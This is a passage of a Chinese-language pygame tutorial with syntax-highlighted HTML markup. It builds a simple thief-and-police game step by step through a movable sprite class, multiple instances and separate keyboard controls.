class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、类的创建"><a href="#三、类的创建" class="headerlink" title="三、类的创建"></a>三、类的创建</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> <span class="token number">1</span>                   <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"thief.jpg"</span><span class="token punctuation">)</span>        <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 类的实例化，先实例化一个小偷</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、多个对象"><a href="#四、多个对象" class="headerlink" title="四、多个对象"></a>四、多个对象</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> image<span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_speed<span class="token punctuation">,</span>image_url<span class="token punctuation">,</span>init_position<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> init_speed                    <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>       <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>          <span class="token comment">#初始位置(横坐标)</span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token comment">#初始位置(纵坐标)</span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 类的实例化，这次实例两个对象</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"thief.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>police <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token string">"police.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>            police<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、分别控制"><a href="#五、分别控制" class="headerlink" title="五、分别控制"></a>五、分别控制</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> image<span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_speed<span class="token punctuation">,</span>image_url<span class="token punctuation">,</span>init_position<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> init_speed                    <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>       <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>          <span class="token comment">#初始位置(横坐标)</span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token comment">#初始位置(纵坐标)</span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 类的实例化，这次实例两个对象</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"thief.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>police <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token string">"police.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">]</span><span class="token punctuation">)</span>            police<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_a<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_d<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_s<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_w<span class="token punctuation">]</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token 